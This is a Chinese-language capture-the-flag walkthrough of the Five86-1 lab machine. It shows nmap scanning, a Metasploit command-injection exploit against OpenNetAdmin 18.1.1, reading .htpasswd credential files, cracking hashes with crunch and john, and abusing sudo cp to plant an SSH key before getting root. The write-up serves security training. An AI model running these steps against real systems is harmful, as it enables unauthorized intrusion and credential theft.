
# 0x00 环境
攻击机：kali（192.168.1.28）<br />靶机：Five86-1（192.168.1.19）


# 0x01实战

## 端口扫描
```
nmap -sV -A -p- 192.168.1.19
```
![](https://img-blog.csdnimg.cn/864371a32c6c49bf8f0e7edc8afed22f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=i8wjF&originHeight=831&originWidth=1263&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到开放了22号端口SSH服务和80、10000端口HTTP服务

访问`http://192.168.1.19:80`是一个空白页面啥也没有<br />![](https://img-blog.csdnimg.cn/20ce58b769774382b37ede5549a2fea3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_19,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=zQQej&originHeight=203&originWidth=666&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

访问`https://192.168.1.19:10000`是一个登录页面<br />![](https://img-blog.csdnimg.cn/63529d504e394e159d757157dd7375ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=vMOaR&originHeight=628&originWidth=967&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

查看页面源码没什么可以利用的<br />![](https://img-blog.csdnimg.cn/5f24ba0519fa4c8eac98c90b003aab88.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=NVdEQ&originHeight=621&originWidth=1333&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 目录扫描
![](https://img-blog.csdnimg.cn/2a1be49a0681484299caa2015d38ed82.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Vi2HW&originHeight=371&originWidth=1120&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在80端口扫到/robots.txt文件，在浏览器访问<br />![](https://img-blog.csdnimg.cn/3c89fc786d0949c6abd921834cf2f111.png#crop=0&crop=0&crop=1&crop=1&id=wk66W&originHeight=145&originWidth=692&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

继续访问/ona，得到了一个不知道是什么页面的页面<br />![](https://img-blog.csdnimg.cn/5355d34dc1ec4e85a69a0fb89931a86c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=fdJ5l&originHeight=483&originWidth=1301&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在这个页面而我们可以看到`您不是最新版本您的版=v18.1.1最新版本=无法确定请下载最新版本。`说明我们的版本是老版本可能存在历史漏洞


## 漏洞发现
出于好奇点击右下方的here跳转到一个页面<br />![](https://img-blog.csdnimg.cn/76bada24b89a42dca9534fe18a3efdd2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ZvSjO&originHeight=774&originWidth=1110&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

通过上面的页面我们可以得知ona全称为OpenNetAdmin，查找历史漏洞
```
searchsploit OpenNetAdmin
```

![](https://img-blog.csdnimg.cn/8e88d82ff6b546d8bcadd9f70c7ac215.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=wmMva&originHeight=277&originWidth=1808&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到OpenNetAdmin 18.1.1版本存在命令注入漏洞


## 漏洞利用
启动MSF搜索OpenNetAdmin
```
search OpenNetAdmin
```
![](https://img-blog.csdnimg.cn/7a5e20ef692a49869c3a804f27e30f63.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ivI7f&originHeight=314&originWidth=1644&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

应用模块设置相关参数并执行，成功得到shell
```
msf6 > use 0
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set rhosts 192.168.1.19
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set lhost 192.168.1.28
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run
```

![](https://img-blog.csdnimg.cn/1eaf3eda555c4a3386c684222a6bbc88.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Zv291&originHeight=387&originWidth=1310&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

查看系统内核版本，没有什么可以利用的
```
cat /proc/version
cat /etc/issue
```

![](https://img-blog.csdnimg.cn/ae9af06ff712407e9ca4fa06c3749940.png#crop=0&crop=0&crop=1&crop=1&id=VmZVy&originHeight=179&originWidth=1731&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

查看具有suid权限的程序
```
find / -user root -perm -4000 -print 2>/dev/null
```
![](https://img-blog.csdnimg.cn/e0b051f65e28418c85c009f9dc1f632c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=DWtyU&originHeight=389&originWidth=1083&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

看见了exim4这让我想到了DC-8，查看exim的版本
```
www-data@five86-1:/opt/ona/www$ cd /usr/sbin/
www-data@five86-1:/usr/sbin$ exim --version
```
![](https://img-blog.csdnimg.cn/e4bb8939769c48a3906f07d3c39a1f03.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=RpK3y&originHeight=351&originWidth=1438&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

搜索漏洞发现没有适合这个版本的漏洞
```
searchsploit exim
```

![](https://img-blog.csdnimg.cn/89e9d814160248be851f6306399c65f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=TX2GX&originHeight=781&originWidth=966&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

搜索一下有哪些文件是当前账户可以查看到的
```
find / -type f -user www-data
```
![](https://img-blog.csdnimg.cn/74ec446953f24328b94218aa4163d7da.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_19,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=owuqG&originHeight=345&originWidth=684&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

发现/var/www/html/reports/.htaccess我们可以访问

查看一下/var/www/html/reports/.htaccess
```
cat /var/www/html/reports/.htaccess
```
![](https://img-blog.csdnimg.cn/2b23076919564663affac6bb49aa8ea9.png#crop=0&crop=0&crop=1&crop=1&id=IT34i&originHeight=197&originWidth=861&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

看到了一个文件路径/var/www/.htpasswd，继续查看
```
cat /var/www/.htpasswd
```

![](https://img-blog.csdnimg.cn/0c28046c66b44483b54d5d740e24b120.png#crop=0&crop=0&crop=1&crop=1&id=hseI7&originHeight=183&originWidth=1033&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

得到了一个账户和密码的hash值并提示我们`一本标准字典可能会失败，此10个字符的密码使用以下字符集：aefhrt`也就是说标准的字典是无法破解的，密码是由`aefhrt`组成的十个字符


## 获取shell
使用crunch生成一个由`aefhrt`组成长度为十的字典https://www.freebuf.com/sectool/170817.html
```
crunch 10 10 aefhrt > pass
```
![](https://img-blog.csdnimg.cn/50b4d9d2ada54e25a1b50f2fc0952a50.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=xfTPL&originHeight=338&originWidth=1370&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

使用john破解
```
john --wordlist=pass test.txt
```
![](https://img-blog.csdnimg.cn/30a62f7ac5ec4910a8c1a54d37bc0547.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=EALzz&originHeight=325&originWidth=1335&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

成功得到密码fatherrrrr，成功登录SSH<br />![](https://img-blog.csdnimg.cn/9a4f45a34171478bbeddf1be678603bb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=jaz0w&originHeight=412&originWidth=1060&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 提权
查看你用户所具有的权限
```
sudo -l
```
![](https://img-blog.csdnimg.cn/b7024a8ed3494fe5811136e95498a502.png#crop=0&crop=0&crop=1&crop=1&id=LAmDy&originHeight=186&originWidth=1354&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到我们唯一能以jen身份无密码执行的命令是cp

在douglas的更目录发现了/.ssh/id_rsa.pub文件<br />![](https://img-blog.csdnimg.cn/16fde24965ac447095e10076406a91bb.png#crop=0&crop=0&crop=1&crop=1&id=iJVku&originHeight=160&originWidth=498&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

那么我能将id_rsa.pub文件cp到jen目录下的/.ssh/authorized_keys文件就能过实现免密登录jen
```
cp id_rsa.pub /tmp
cd /tmp
sudo -u jen cp id_rsa.pub /home/jen/.ssh/authorized_keys
```

![](https://img-blog.csdnimg.cn/cd8781e5d6984947a2eeebf02dba4b9d.png#crop=0&crop=0&crop=1&crop=1&id=Gc7cI&originHeight=169&originWidth=1024&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

登录jen用户<br />![](https://img-blog.csdnimg.cn/d7d803e8d9134945934ac24385c9e3a2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Chcm6&originHeight=387&originWidth=1051&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

登陆后显示`You have new mail.`那就去查看一下<br />![](https://img-blog.csdnimg.cn/b48462ca39e34848b38fad3145b940b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=FZ8Aj&originHeight=276&originWidth=1798&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

显示moss的密码改为Fire!Fire!

登录moss账户<br />![](https://img-blog.csdnimg.cn/1f907110f0814d05839350d3103508b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=QFN57&originHeight=413&originWidth=1039&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在moss账户下发现隐藏文件.game中有一个upyourgame程序具有root权限<br />![](https://img-blog.csdnimg.cn/56b7cc2e77c94fa3b7a0010cd459f40d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=nbpRO&originHeight=710&originWidth=1659&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

尝试执行upyourgame，执行之后回答几个问题莫名其妙得到root权限<br />![](https://img-blog.csdnimg.cn/8362a400b2a8419c978598da88bcd7a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=wJU5s&originHeight=495&originWidth=887&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## final-flag
在root根目录下找到flag<br />![](https://img-blog.csdnimg.cn/7bd3b045675546689513fa5da836ff21.png#crop=0&crop=0&crop=1&crop=1&id=pTTYW&originHeight=169&originWidth=455&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
